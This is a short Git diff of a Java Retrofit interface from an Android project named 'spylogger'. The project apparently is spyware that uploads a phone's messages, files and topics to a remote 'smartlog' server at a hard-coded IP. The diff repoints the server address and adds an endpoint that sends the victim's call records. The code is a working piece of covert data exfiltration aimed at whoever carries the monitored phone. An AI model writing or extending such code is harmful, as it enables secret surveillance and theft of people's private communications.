@@ -1,5 +1,6 @@
 package com.gravatasufoca.spylogger.services;
 
+import com.gravatasufoca.spylogger.model.Ligacao;
 import com.gravatasufoca.spylogger.model.Mensagem;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
@@ -22,8 +23,8 @@ import retrofit2.http.Path;
 
 public interface SendDataInterface {
 
-    String ip="172.24.35.147";
-//    String ip="192.168.1.118";
+//    String ip="172.24.35.147";
+    String ip="192.168.1.118";
 
     String apiUrl="http://"+ip+"/smartlog/api/v1/";
 
@@ -35,6 +36,9 @@ public interface SendDataInterface {
 
     @POST(apiUrl+"receber/mensagens")
     Call<RespostaRecebimentoVO> enviarMensagens(@Body List<Mensagem> mensagens);
+
+    @POST(apiUrl+"receber/ligacoes")
+    Call<RespostaRecebimentoVO> enviarLigacoes(@Body List<Ligacao> ligacoes);
 
     @POST(apiUrl+"receber/arquivo")
     Call<Boolean> enviarArquivo(@Body EnvioArquivoVO envioArquivoVO);
